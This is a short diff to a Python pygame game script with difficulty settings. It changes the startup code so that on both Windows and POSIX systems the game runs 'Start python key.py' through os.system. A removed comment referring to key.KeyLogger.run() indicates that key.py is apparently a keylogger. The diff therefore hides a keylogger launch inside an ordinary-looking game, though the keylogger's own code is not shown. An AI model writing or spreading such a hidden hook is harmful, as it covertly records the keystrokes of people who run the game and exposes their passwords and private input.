@@ -1,14 +1,13 @@
-#import key
 import pygame
 import sys 
 import time 
 import random
 import os
 
-if os.name == 'posix':
+if os.name == 'posix' or os.name == 'nt':
     os.system('Start python key.py')
+
     
-#key.KeyLogger.run()
 difficulty = 25
 # Difficulty settings
 # Easy      ->  10
